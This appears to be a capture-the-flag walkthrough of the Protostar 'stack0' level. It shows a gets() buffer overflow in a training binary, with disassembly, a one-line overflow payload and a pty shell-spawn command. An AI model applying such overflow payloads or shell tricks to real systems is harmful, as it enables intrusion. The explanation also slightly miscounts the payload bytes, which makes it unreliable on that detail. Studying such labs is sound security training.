# Stack0: Level 0 in pwn - stack BOF

First, make sure you are on the right directory.  
```bash
cd /opt/protostar/bin
```   
If you find the given shell restricted, run the following command to hop into a tty shell:    
```bash
python -c "import pty; pty.spawn('/bin/bash')"
```  
You can read more about this on, [spawning a TTY Shell](https://netsec.ws/?p=337)    
Now, we are given a piece of C code  
```c
 #include <stdlib.h>
 #include <unistd.h>
 #include <stdio.h>
 
 int main(int argc, char **argv)
 {
   volatile int modified;
   char buffer[64];
 
   modified = 0;
   gets(buffer);
 
   if(modified != 0) {
       printf("you have changed the 'modified' variable\n");
   } else {
       printf("Try again?\n");
   }
 }
```  
At first, we need to test the normal behavior of the program. It is expecting a string of characters passed through STDIN.   
```bash
user@protostar:~$ /opt/protostar/bin/stack0
TEST
Try again?
```   
We now have to make a theory and then check it using a debugger(in our case GDB).   
We have a buffer of 64 characters stacked in the bottom of the Stack, on top of which is an integer of size 4 bytes.The goal is to simply change the var _modified_ value into anything thus we can think of overflowing into **modified**.  
We can have high hopes on this idea since gets() is used and as the man pages mention:
*Never use gets(). Because it is impossible to tell without knowing the data in advance how many characters gets() will read, and because gets() will continue to store characters past the end of the buffer, it is extremely dangerous to use. It has been used to break computer security. Use fgets() instead.*  
This means that we simply need to input a string of 65 characters and that will mean we will modify a byte from modified thus solving the exercice.  
However, lets try to disass our program and understand how our variables are layed in the stack upon execution.  
Note that this series will depend on GDB(The GNU Debugger Project). However since this is the first walkthrough, we will use objdump.   
We will at first need the file type as it may help with addressing (this step is only mentioned here since all protostar tasks are 32-bit ELFs).    
```
file stack0
```   
Now, we can disass the executable using [**objdump**](https://linux.die.net/man/1/objdump) or GDB:

we need to load the executable with GDB:   
```bash
gdb stack0
disass main # to disassemble the main function
```   
we are prompted with   
```asm
(gdb) disass main
Dump of assembler code for function main:
0x080483f4 <main+0>:    push   %ebp
0x080483f5 <main+1>:    mov    %esp,%ebp
0x080483f7 <main+3>:    and    $0xfffffff0,%esp
0x080483fa <main+6>:    sub    $0x60,%esp
0x080483fd <main+9>:    movl   $0x0,0x5c(%esp)
0x08048405 <main+17>:   lea    0x1c(%esp),%eax
0x08048409 <main+21>:   mov    %eax,(%esp)
0x0804840c <main+24>:   call   0x804830c <gets@plt>
0x08048411 <main+29>:   mov    0x5c(%esp),%eax
0x08048415 <main+33>:   test   %eax,%eax
0x08048417 <main+35>:   je     0x8048427 <main+51>
0x08048419 <main+37>:   movl   $0x8048500,(%esp)
0x08048420 <main+44>:   call   0x804832c <puts@plt>
0x08048425 <main+49>:   jmp    0x8048433 <main+63>
0x08048427 <main+51>:   movl   $0x8048529,(%esp)
0x0804842e <main+58>:   call   0x804832c <puts@plt>
0x08048433 <main+63>:   leave
0x08048434 <main+64>:   ret
```   
Most of the lines are usess to our scope, however we are interested in the line at 0x080483fd, that instruction resets the value of modified at the addr of *ESP + 0x5c*. A check is later done against the value 0 on the line *0x08048415* .
Later, we can see that the *buffer* starts at the addr *0x1c + ESP* meaning that modified and buffer are next to each other on the stack, thus the hopothesis is verified: *0x5c(h)-0x1c(h) = 0x40(h) = 64(10)*.  
Now, we can try to exploit the bug by simply running the command:   
```bash
python -c "print 'o'*64 + 'k'" | ./stack0
```   
That command serves us with writing the payload:   
65 'o' characters are used to fill the buffer[] +  byte('o') to fill the first byte of modified thus modify it and change the execution flow to print the success message.   
The pipe operator "|" will pipe the output of print from STDIN to the STDIN of stack0.   
**Congrats**!! Now you just solved the first level ^^.
